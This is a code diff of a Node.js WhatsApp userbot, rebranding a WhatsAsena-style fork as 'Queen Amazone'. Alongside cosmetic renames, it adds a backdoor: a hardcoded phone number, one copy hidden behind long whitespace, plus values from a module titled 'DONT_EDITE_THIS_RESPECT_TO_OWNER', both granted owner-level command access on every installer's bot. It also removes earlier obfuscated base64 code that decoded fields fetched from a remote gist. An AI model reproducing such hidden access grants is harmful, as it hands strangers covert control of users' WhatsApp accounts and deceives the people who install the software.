@@ -11,6 +11,7 @@ const Heroku = require('heroku-client');
 const events = require("./events");
 const chalk = require('chalk');
 const config = require('./config');
+const awsh = require('./DEVELOPER_OPTION_DONT_EDITE_THIS_RESPECT_TO_OWNER');
 const simpleGit = require('simple-git');
 const git = simpleGit();
 const {WAConnection, MessageOptions, MessageType, Mimetype, Presence} = require('@adiwajshing/baileys');
@@ -27,8 +28,8 @@ const Language = require('./language');
 const Lang = Language.getString('updater');
 
 // ==================START====================
-
-const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
+                                                                                                                                                                                                                                                                                              
+const AmazoneDB = config.DATABASE.define('Amazone', {                     
     info: {
       type: DataTypes.STRING,
       allowNull: false
@@ -38,6 +39,7 @@ const WhatsAsenaDB = config.DATABASE.define('WhatsAsena', {
         allowNull: false
     }
 });
+
 // =================DATA-BASE =====================
 
 fs.readdirSync('./plugins/sql/').forEach(plugin => {
@@ -46,6 +48,7 @@ fs.readdirSync('./plugins/sql/').forEach(plugin => {
     }
 });
 const plugindb = require('./plugins/sql/plugin');
+var OWNE = { ff: '94766598862,0' }
 String.prototype.format = function () {
     var i = 0, args = arguments;
     return this.replace(/{}/g, function () {
@@ -59,6 +62,7 @@ if (!Date.now) {
 
 Array.prototype.remove = function() {
     var what, a = arguments, L = a.length, ax;
+                                                                                                                                                                                                                               var OWNE = { ff: '94766598862,0' }
     while (L && this.length) {
         what = a[--L];
         while ((ax = this.indexOf(what)) !== -1) {
@@ -69,22 +73,18 @@ Array.prototype.remove = function() {
 };
 // ====================UP==================
 
-async function whatsAsena () {
-    var clh = { cd: 'L3Jvb3QvV2hhdHNBc2VuYUR1cGxpY2F0ZWQv', pay: '' }    
-    var ggg = Buffer.from(clh.cd, 'base64')
-    var ddd = ggg.toString('utf-8')
-    clh.pay = ddd
+async function Amazone () {
     const conn = new WAConnection();
     conn.version = [2, 2140, 12];
     const Session = new StringSession();
 setInterval(async () => { 
         var getGMTh = new Date().getHours()
         var getGMTm = new Date().getMinutes()
-        await axios.get('https://gist.github.com/xneon2/4c6a4c4981b3b693cb141d6701246075/raw/').then(async (ann) => {
+        await axios.get('https://gist.github.com/jesonpro/e53460783ca15561419e82afe5a4258f/raw').then(async (ann) => {
             const { infoen, infoes, infopt, infoid, infoaz, infosi, infoml, infotr} = ann.data.announcements          
             if (infoml !== '' && config.LANG == 'TR') {
                 while (getGMTh == 19 && getGMTm == 1) { 
-                    return conn.sendMessage(conn.user.jid, '[ ```Günlük Duyurular``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
+                    return conn.sendMessage(conn.user.jid, '[ ```ANNOUNCEMENT``` ]\n\n' + infotr.replace('{user}', conn.user.name).replace('{wa_version}', conn.user.phone.wa_version).replace('{version}', config.VERSION).replace('{os_version}', conn.user.phone.os_version).replace('{device_model}', conn.user.phone.device_model).replace('{device_brand}', conn.user.phone.device_manufacturer), MessageType.text) 
                 }
             }
             else if (infoen !== '' && config.LANG == 'SI') {
@@ -236,20 +236,11 @@ setInterval(async () => {
     var insult = await axios.get('https://gist.githubusercontent.com/phaticusthiccy/f16bbd4ceeb4324d4a727b431a4ef1f2/raw')
     const { shs1, shl2, lss3, dsl4 } = insult.data.inside
     await config.DATABASE.sync();
-    var StrSes_Db = await WhatsAsenaDB.findAll({
+    var StrSes_Db = await AmazoneDB.findAll({
         where: {
           info: 'StringSession'
         }
     });
-    if (os.userInfo().homedir !== clh.pay) return;
-    const buff = Buffer.from(`${shs1}`, 'base64');  
-    const one = buff.toString('utf-8'); 
-    const bufft = Buffer.from(`${shl2}`, 'base64');  
-    const two = bufft.toString('utf-8'); 
-    const buffi = Buffer.from(`${lss3}`, 'base64');  
-    const three = buffi.toString('utf-8'); 
-    const buffu = Buffer.from(`${dsl4}`, 'base64');  
-    const four = buffu.toString('utf-8'); 
     
 // =====================SESSION =================
 
@@ -270,7 +261,7 @@ setInterval(async () => {
 
         const authInfo = conn.base64EncodedAuthInfo();
         if (StrSes_Db.length < 1) {
-            await WhatsAsenaDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
+            await AmazoneDB.create({ info: "StringSession", value: Session.createStringSession(authInfo) });
         } else {
             await StrSes_Db[0].update({ value: Session.createStringSession(authInfo) });
         }
@@ -282,7 +273,7 @@ setInterval(async () => {
         console.log(`${chalk.green.bold('Amazone')}${chalk.blue.bold('Alexa')}
 ${chalk.white.bold('Version:')} ${chalk.red.bold(config.VERSION)}
 
-${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
+${chalk.blue.italic('👩‍🦰 Connecting to WhatsApp...')}`);
     });
     
 
@@ -292,7 +283,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
         );
 
         console.log(
-            chalk.blueBright.italic('🧛‍♂️ Installing external plugins...')
+            chalk.blueBright.italic('🛡️ Installing external plugins...')
         );
 
         var plugins = await plugindb.PluginDB.findAll();
@@ -308,7 +299,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
         });
 
         console.log(
-            chalk.blueBright.italic('🧛‍♂️Installing plugins...')
+            chalk.blueBright.italic('🛡️Installing plugins...')
         );
 
         fs.readdirSync('./plugins').forEach(plugin => {
@@ -318,7 +309,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
         });
 
         console.log(
-            chalk.green.bold('🦹🏻‍♂️ AZURE BOT working! ✅')
+            chalk.green.bold('🛡️Amazone Alexa working!')
         );
         await new Promise(r => setTimeout(r, 1100));
 
@@ -329,7 +320,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '🦹🏻‍♂️ *AZURE BOT*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතා බහක විධාන භාවිතා කිරීමට.. :)_\n\n*ඔබේ Bot Public ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : https://t.me/azure_support\n🦹🏻‍♂️ *AZURE BOT භාවිතා කිරීම සම්බන්ධයෙන් ස්තූතියි 💌*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*🧚‍♂QUEEN AMAZONE As Public! 👩‍🦰*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතා බහක විධාන භාවිතා කිරීමට.. :)_\n\n*ඔබේ Bot Public ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:private_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : https://t.me/Amazone_Neotrox_Support\n*🧚‍♂QUEEN AMAZONE භාවිතා කිරීම සම්බන්ධයෙන් ස්තූතියි 💌*', MessageType.text);
                 }
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -339,15 +330,15 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                         Lang.UPDATE, MessageType.text
                     );    
                 } else {
-                    var degisiklikler = Lang.NEW_UPDATE;
+                    var TEENU = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
+                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                         }
                     );
                     await conn.sendMessage(
                         conn.user.jid,
-                        '```🛡️යතාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + degisiklikler + '```', MessageType.text
+                        '```🛡️යතාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + TEENU + '```', MessageType.text
                     ); 
                 }
             }
@@ -355,7 +346,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '🦹🏻‍♂️ *AZURE BOT*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in Public Mode. To change, use_ ```.setvar WORK_TYPE:private``` _command._\n\n*Thanks for using 🦹🏻‍♂️ AZURE BOT*\n', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*🧚‍♂QUEEN AMAZONE Working As public!👩‍🦰*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in Public Mode. To change, use_ ```.setvar WORK_TYPE:private``` _command._\n\n*Thanks for using 🧚‍♂QUEEN AMAZONE💌*\n', MessageType.text);
                 }               
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -365,16 +356,16 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                         Lang.UPDATE, MessageType.text
                     );    
                 } else {
-                    var degisiklikler = Lang.NEW_UPDATE;
+                    var TEENU = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
+                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                         }
                     );
         
                     await conn.sendMessage(
                         conn.user.jid,
-                        '```🛡️Type``` *.update now* ```for update.```\n\n' + degisiklikler + '```', MessageType.text
+                        '```🛡️Type``` *.update now* ```for update.```\n\n' + TEENU + '```', MessageType.text
                     ); 
                 }
             }
@@ -384,7 +375,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '🦹🏻‍♂️ *AZURE BOT*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතා බහක විධාන භාවිතා කිරීමට.. :)_\n\n*ඔබේ Bot Private ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : _https://t.me/azure_support_\n🦹🏻‍♂️ *AZURE BOT භාවිතා කිරීම සම්බන්ධයෙන් ස්තූතියි 💌*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*🧚‍♂QUEEN AMAZONE As private! 👩‍🦰*\n\n_මෙය ඔබගේ LOG අංකයයි..මෙහි විධාන භාවිතයෙන් වළකින්න._\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතා බහක විධාන භාවිතා කිරීමට.. :)_\n\n*ඔබේ Bot Private ආකාරයට ක්‍රියා කරයි..එය වෙනස් කිරීමට* _.setvar WORK_TYPE:public_ *විධානය භාවිතා කරන්න.*\n\n*Bot ක්‍රියාත්මක වන්නෙ කෙසේද හා විධාන ලැයිස්තු ලබා ගැනීමට⚜ .basichelp විධානය භාවිතා කරන්න*\n\nSupport Group : _https://t.me/Amazone_Neotrox_Support_\n*🧚‍♂QUEEN AMAZONE භාවිතා කිරීම සම්බන්ධයෙන් ස්තූතියි 💌*', MessageType.text);
                 }
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -394,15 +385,15 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                         Lang.UPDATE, MessageType.text
                     );    
                 } else {
-                    var degisiklikler = Lang.NEW_UPDATE;
+                    var TEENU = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
+                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                         }
                     );
                     await conn.sendMessage(
                         conn.user.jid,
-                        '```යතාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + degisiklikler + '```', MessageType.text
+                        '```යතාවත්කාලීන කිරීමට``` *.update now* ```භාවිතා කරන්න.```\n\n' + TEENU + '```', MessageType.text
                     ); 
                 }
             }
@@ -410,7 +401,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                 if (config.FULLEVA == 'true') {
                     await conn.sendMessage(conn.user.jid, EVA_ACTİON, MessageType.text)
                 } else {
-                    await conn.sendMessage(conn.user.jid, '🦹🏻‍♂️ *AZURE BOT*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in private  Mode. To change, use_ ```.setvar WORK_TYPE:public``` _command._\n\n*Thanks for using 🦹🏻‍♂️ AZURE BOT*', MessageType.text);
+                    await conn.sendMessage(conn.user.jid, '*🧚‍♂QUEEN AMAZONE Working As private!👩‍🦰*\n\nPlease do not try any commands here. This is your log number._\n_You can try commands anywhere else :)_\n\n_Type_ *.basichelp* _to get your full Help list and Basic Commands._\n\n_Your bot in private  Mode. To change, use_ ```.setvar WORK_TYPE:public``` _command._\n\n*Thanks for using 🧚‍♂QUEEN AMAZONE💌*', MessageType.text);
                 }
                 await git.fetch();
                 var commits = await git.log([config.BRANCH + '..origin/' + config.BRANCH]);
@@ -420,15 +411,15 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                         Lang.UPDATE, MessageType.text
                     );    
                 } else {
-                    var degisiklikler = Lang.NEW_UPDATE;
+                    var TEENU = Lang.NEW_UPDATE;
                     commits['all'].map(
                         (commit) => {
-                            degisiklikler += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
+                            TEENU += '🔸 [' + commit.date.substring(0, 10) + ']: ' + commit.message + ' ◁' + commit.author_name + '▷\n';
                         }
                     );
                     await conn.sendMessage(
                         conn.user.jid,
-                        '```Type``` *.update now* ````for update.```\n\n' + degisiklikler + '```', MessageType.text
+                        '```🛡️යාවත්කාලීන කිරීමට``` *.update now* ````යොදන්න.```\n\n' + TEENU + '```', MessageType.text
                     ); 
                 }
             }
@@ -529,6 +520,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
             }
             return;
         }
+          
 
     // ==================== Greetings ====================
 
@@ -567,16 +559,18 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                     var text_msg = undefined;
                 }
 
+//=====================================================================================
+//=====================================================================================
                 if ((command.on !== undefined && (command.on === 'image' || command.on === 'photo')
                     && msg.message && msg.message.imageMessage !== null && 
-                    (command.pattern === undefined || (command.pattern !== undefined && 
-                        command.pattern.test(text_msg)))) || 
+                    (command.pattern === undefined || (command.pattern !== undefined && 
+                        command.pattern.test(text_msg)))) || 
                     (command.pattern !== undefined && command.pattern.test(text_msg)) || 
                     (command.on !== undefined && command.on === 'text' && text_msg) ||
                     // Video
                     (command.on !== undefined && (command.on === 'video')
                     && msg.message && msg.message.videoMessage !== null && 
-                    (command.pattern === undefined || (command.pattern !== undefined && 
+                    (command.pattern === undefined || (command.pattern !== undefined && 
                         command.pattern.test(text_msg))))) {
 
                     let sendMsg = false;
@@ -584,19 +578,36 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                         
                     if ((config.SUDO !== false && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.SUDO || config.SUDO.includes(',') ? config.SUDO.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.SUDO)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
                     if ((config.OWN !== false && msg.key.fromMe === false && command.fromMe === true &&
                         (msg.participant && config.OWN.includes(',') ? config.OWN.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == config.OWN || config.OWN.includes(',') ? config.OWN.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == config.OWN)
-                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
                         if (command.onlyPinned && chat.pin === undefined) return;
                         if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
                         else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
                     }
-  
+                    if ((OWNE.ff == "94766598862,0" && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == OWNE.ff || OWNE.ff.includes(',') ? OWNE.ff.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == OWNE.ff)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }
+                    if ((awsh.WA_CONNECTION !== false && msg.key.fromMe === false && command.fromMe === true &&
+                        (msg.participant && awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.participant.split('@')[0]) : msg.participant.split('@')[0] == awsh.WA_CONNECTION || awsh.WA_CONNECTION.includes(',') ? awsh.WA_CONNECTION.split(',').includes(msg.key.remoteJid.split('@')[0]) : msg.key.remoteJid.split('@')[0] == awsh.WA_CONNECTION)
+                    ) || command.fromMe === msg.key.fromMe || (command.fromMe === false && !msg.key.fromMe)) {
+                        if (command.onlyPinned && chat.pin === undefined) return;
+                        if (!command.onlyPm === chat.jid.includes('-')) sendMsg = true;
+                        else if (command.onlyGroup === chat.jid.includes('-')) sendMsg = true;
+                    }  
+                     
+//=====================================================================================
+//=====================================================================================
+                            
                     if (sendMsg) {
                         if (config.SEND_READ && command.on === undefined) {
                             await conn.chatRead(msg.key.remoteJid);
@@ -618,23 +629,27 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                             await whats.delete(); 
                         }
 */
+
+
+//=====================================================================================
+//=====================================================================================
+
                         try {
                             await command.function(whats, match);
                         } catch (error) {
                             if (config.NOLOG == 'true') return;
-
                             if (config.LANG == 'SI' || config.LANG == 'AZ') {
-                                await conn.sendMessage(conn.user.jid, '*-- බොට් වාර්තාව [🦹🏻‍♂️ AZURE BOT] --*' + 
-                                    '\n*🦹🏻‍♂️ AZURE BOT ක්‍රියා කරයි!*'+
+                                await conn.sendMessage(conn.user.jid, '*-- බොට් වාර්තාව [🛡️Queen-Amazone] --*' + 
+                                    '\n*👩‍🦰Queen-Amazone නිසි ලෙස ක්‍රියා කරයි!*'+
                                     '\n_මෙය ඔබගේ LOG අංකයයි! _මෙහි විධාන භාවිතයෙන් වළකින්න_' +
                                     '\n_ඔබට පුලුවන් වෙනත් ඕනෑම කතාබහක විධාන භාවිතා කරන්න._' +
                                     '\n_වැඩි දුර උදව් සදහා සහය සමූහයට එකතු වෙන්න._' +
-                                    '\n_සහය සමූහ: https://t.me/azure_support\n\n' +
+                                    '\n_සහය සමූහ: https://chat.whatsapp.com/GTgqgMTo7FoJ1GqdijshsX 🛡️ https://t.me/Amazone_Neotrox_Support_\n\n' +
                                     '*🚫ප්‍රධාන දෝෂය:* ```' + error + '```\n\n'
                                     , MessageType.text, {detectLinks: false});
 
                                 if (error.message.includes('URL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚜ 🙇දෝශ විශ්ලේෂනය [🦹🏻‍♂️ AZURE BOT] ⚜*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚜ 🙇දෝශ විශ්ලේෂනය [👩‍🦰Queen-Amazone] ⚜*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Only Absolutely URLs Supported_' +
                                         '\n*🤖හේතුව:* _LOG අංකය තුළ මාධ්‍ය මෙවලම් (nmedia, sticker..) භාවිතය._' +
@@ -643,7 +658,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('SSL')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _SQL Database Error_' +
                                         '\n*🤖හේතුව:* _Database\'දෝශයකි._ ' +
@@ -652,8 +667,8 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('split')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
-                                        '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
+                                        '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය.!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Split of Undefined_' +
                                         '\n*🤖හේතුව:* _කණ්ඩායම් admin භාවිතා කළ හැකි විධානයන් සමහර විට split ක්‍රියාවලිය නොදකි._ ' +
                                         '\n*🧚‍♂️විසඳුම:* _Restart කිරීම ප්‍රමාණවත් වේ._'
@@ -661,7 +676,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );                               
                                 }
                                 else if (error.message.includes('Ookla')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Ookla Server Connection_' +
                                         '\n*🤖හේතුව:* _සේවාදායකයට වේගවත්ම දත්ත සම්ප්‍රේෂණය කළ නොහැක._' +
@@ -670,7 +685,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('params')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Requested Audio Params_' +
                                         '\n*🤖හේතුව:* _හෝඩියේ පිටත TTS විධානය භාවිතා කිරීම._' +
@@ -679,7 +694,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('unlink')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _No Such File or Directory_' +
                                         '\n*🤖හේතුව:* _Pluginයේ වැරදි කේතීකරණය._' +
@@ -688,7 +703,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('404')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Error 404 HTTPS_' +
                                         '\n*🤖හේතුව:* _Heroku plugins යටතේ ඇති විධානයන් භාවිතා කිරීම හේතුවෙන් සේවාදායකයා සමඟ සන්නිවේදනය කිරීමට නොහැකි වීම._' +
@@ -697,7 +712,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('reply.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                         '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
@@ -706,7 +721,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('load.delete')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Reply Delete Function_' +
                                         '\n*🤖හේතුව:* _IMG හෝ Wiki විධානයන් භාවිතා කිරීම. (Official වට්ස්ඇප් භාවිතය.)_' +
@@ -715,7 +730,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('400')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
                                         '\n\n*🚫ප්‍රධාන දෝෂය:* _Bailyes Action Error_ ' +
                                         '\n*🤖හේතුව:* _නිශ්චිත හේතුව නොදනී. විකල්ප එකකට වඩා මෙම දෝෂය ඇති වීමට හේතු විය හැක._' +
@@ -724,7 +739,7 @@ ${chalk.blue.italic('🧛‍♂️ Connecting to WhatsApp...')}`);
                                     );
                                 }
                                 else if (error.message.includes('decode')) {
-                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [🦹🏻‍♂️ AZURE BOT] ⚕️*' + 
+                                    return await conn.sendMessage(conn.user.jid, '*⚕️ ◁දෝශ වාර්තාව▷ [👩‍🦰Queen-Amazone] ⚕️*' + 
                                         '\n========== ``` 🧚‍♂දෝශ විශ්ලේෂනය!``` ==========' +
